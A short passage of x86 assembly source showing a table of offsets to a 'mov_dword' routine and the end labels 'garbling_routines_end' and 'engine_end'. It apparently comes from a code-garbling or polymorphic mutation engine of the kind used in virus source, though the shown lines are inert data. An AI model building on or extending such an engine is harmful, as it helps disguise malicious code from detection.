       dd ofs mov_dword-ofs engine      ;The 32b instructions are the main
       dd ofs mov_dword-ofs engine      ;part of all programs
       dd ofs mov_dword-ofs engine

garbling_routines_end:

engine_end:
